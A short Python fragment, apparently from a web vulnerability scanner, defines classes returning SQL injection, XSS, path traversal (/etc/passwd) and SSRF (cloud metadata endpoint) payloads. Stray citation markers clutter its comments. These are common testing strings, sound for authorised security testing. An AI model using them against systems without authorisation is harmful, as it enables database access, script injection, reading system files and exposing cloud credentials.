class VectorSQLi:
    def name(self): return "SQLi"
    def payloads(self, nexus):
        # [span_19](start_span)Payloads from debugged script[span_19](end_span)
        return ["1' OR SLEEP(5)-- -", "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "' OR 1=1--"]

class VectorXSS:
    def name(self): return "XSS"
    def payloads(self, nexus):
        # [span_20](start_span)Payloads from debugged script[span_20](end_span)
        return ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"]

class VectorLFI:
    def name(self): return "LFI"
    def payloads(self, nexus):
        # [span_21](start_span)Payloads from debugged script[span_21](end_span)
        return ["../../../../etc/passwd", "/etc/passwd"]

class VectorSSRF:
    def name(self): return "SSRF"
    def payloads(self, nexus):
        return ["http://169.254.169.254/latest/meta-data/"]
